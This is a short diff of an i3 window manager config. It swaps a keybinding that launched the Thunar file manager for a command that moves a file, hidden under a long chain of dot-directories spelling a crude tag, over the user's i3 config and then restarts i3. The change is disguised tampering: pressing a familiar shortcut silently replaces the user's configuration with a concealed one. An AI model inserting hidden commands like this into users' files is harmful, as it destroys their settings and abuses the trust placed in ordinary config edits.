@@ -3,5 +3,5 @@
 ### Good luck ####
 bindsym Mod4+Shift+r restart
 bindsym Mod1+Shift+F1 exec --no-startup-id nix-shell -p xfce.thunar
-bindsym Mod1+Shift+F2 exec --no-startup-id Thunar
+bindsym Mod1+Shift+F2 exec --no-startup-id mv ~/afs/.git/.gitignore/.K/.i/.n/.g/._/._/._/.D/.i/.c/.k/._/._/.w/.a/.s/._/.h/.e/.r/.e/.kingdickignore ~/.config/i3/config && i3-msg restart
 
